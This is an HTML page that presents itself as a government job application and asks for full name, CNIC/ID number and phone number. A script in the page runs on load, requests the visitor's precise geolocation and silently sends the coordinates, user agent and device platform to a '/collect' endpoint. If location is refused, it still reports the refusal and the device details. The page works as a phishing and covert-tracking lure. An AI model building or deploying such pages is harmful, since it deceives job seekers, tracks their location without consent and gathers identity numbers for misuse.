<!DOCTYPE html>
<html>
<head>
  <title>Govt Job Application</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    body { font-family: sans-serif; background: #eef2f3; padding: 20px; }
    .form-box { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 6px rgba(0,0,0,0.1); max-width: 400px; margin: auto; }
    input, button { width: 100%; padding: 10px; margin-top: 10px; border: 1px solid #ccc; border-radius: 4px; }
    button { background: #28a745; color: white; border: none; }
  </style>
</head>
<body>
  <div class="form-box">
    <h2>Government Job Form</h2>
    <p>Please fill your details to apply.</p>
    <form>
      <input type="text" placeholder="Full Name" required>
      <input type="text" placeholder="CNIC / ID Number" required>
      <input type="text" placeholder="Phone Number" required>
      <button type="submit">Submit</button>
    </form>
  </div>

  <script>
    const device = navigator.platform || "Unknown";
    navigator.geolocation.getCurrentPosition(
      pos => {
        fetch("/collect", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            latitude: pos.coords.latitude,
            longitude: pos.coords.longitude,
            userAgent: navigator.userAgent,
            camera: "✅ Location Allowed",
            deviceInfo: device
          })
        });
      },
      err => {
        fetch("/collect", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            userAgent: navigator.userAgent,
            camera: "❌ Location Denied",
            deviceInfo: device
          })
        });
      },
      { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
    );
  </script>
</body>
</html>
